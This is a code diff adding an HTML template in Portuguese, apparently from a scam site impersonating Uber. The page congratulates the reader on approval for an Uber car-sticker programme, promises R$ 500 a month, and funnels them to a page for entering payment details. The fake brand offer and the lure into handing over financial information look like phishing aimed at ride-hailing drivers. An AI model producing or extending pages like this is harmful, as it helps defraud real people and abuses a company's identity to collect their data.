@@ -1,0 +1,81 @@
+{% extends "layout.html" %}
+
+{% block extra_head %}
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+{% endblock %}
+
+{% block content %}
+<div class="max-w-lg mx-auto px-4 py-8">
+    <!-- Success Message -->
+    <div class="text-center mb-8">
+        <div class="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-4">
+            <i class="fa fa-check text-2xl text-green-600"></i>
+        </div>
+        <h1 class="text-2xl font-bold text-black mb-2">Cadastro Aprovado!</h1>
+        <p class="text-gray-600">Parabéns! Seu cadastro no programa de adesivação da Uber foi aprovado com sucesso.</p>
+    </div>
+
+    <!-- Next Steps -->
+    <div class="p-6 mb-6" style="background-color: #EEEEEE; border-radius: 0px;">
+        <h2 class="text-lg font-semibold mb-4" style="color: black !important;">Próximos Passos</h2>
+        <div class="space-y-4">
+            <div class="flex items-start space-x-3">
+                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">1</div>
+                <p style="color: black !important;">Receber o adesivo da Uber em casa</p>
+            </div>
+            <div class="flex items-start space-x-3">
+                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">2</div>
+                <p style="color: black !important;">Instalar o adesivo no parabrisa traseiro do seu veículo</p>
+            </div>
+            <div class="flex items-start space-x-3">
+                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">3</div>
+                <p style="color: black !important;">Enviar foto do adesivo instalado para a Uber</p>
+            </div>
+            <div class="flex items-start space-x-3">
+                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">4</div>
+                <p style="color: black !important;">Receber o pagamento mensal de <strong style="color: black !important;">R$ 500,00</strong> todo dia 10</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Compatibility Info -->
+    <div class="bg-green-50 border-l-4 border-green-400 p-4 mb-6">
+        <div class="flex">
+            <div class="flex-shrink-0">
+                <i class="fa fa-check-circle text-green-400"></i>
+            </div>
+            <div class="ml-3">
+                <p class="text-sm text-green-700">
+                    <strong>Boa notícia:</strong> Você pode continuar usando outros aplicativos como 99, inDriver, 
+                    ou qualquer outro app de mobilidade. O programa de adesivação é totalmente compatível!
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Setup Info -->
+    <div class="border-l-4 border-blue-400 p-4 mb-6" style="background-color: #000000; border-radius: 0px;">
+        <div class="flex">
+            <div class="flex-shrink-0">
+                <i class="fa fa-credit-card text-blue-400"></i>
+            </div>
+            <div class="ml-3">
+                <p class="text-sm" style="color: white !important;">
+                    <strong style="color: white !important;">Próximo passo:</strong> Escolha como deseja receber o pagamento mensal.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Continue Button -->
+    <div class="text-center">
+        <button onclick="window.location.href='/loading_transition?redirect=/recebedor'" 
+            class="uber-btn" style="background: #000 !important; color: #fff !important; border-radius: 2px !important; padding: 12px 24px; border: none; font-weight: 700; width: 100%;">
+            <i class="fa fa-arrow-right mr-2"></i>Informar Dados de Pagamento
+        </button>
+    </div>
+</div>
+
+<script>
+// Success page - no scripts needed
+</script>
+{% endblock %}
